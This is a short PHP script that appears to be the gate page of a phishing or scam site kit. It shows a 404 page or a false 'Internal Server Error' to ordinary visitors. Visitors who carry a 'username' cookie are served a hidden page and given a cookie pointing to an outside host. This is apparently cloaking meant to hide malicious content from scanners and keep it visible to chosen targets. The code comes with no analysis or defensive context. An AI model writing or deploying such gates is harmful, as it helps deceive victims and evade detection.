<?php
define('ROOT_DIR', dirname(__FILE__));
$tzurl = "https://111.biznestop.com/dat04";
$includefile = 'eight/404.html';
if(!empty($_COOKIE['username'])){
setcookie('tzname',$tzurl, 0);
$includefile = 'eight/s1.html';
}

if(@!file_exists($includefile)) {
	echo 'Internal Server Error';
	exit;
}else{
	include $includefile;
}


?>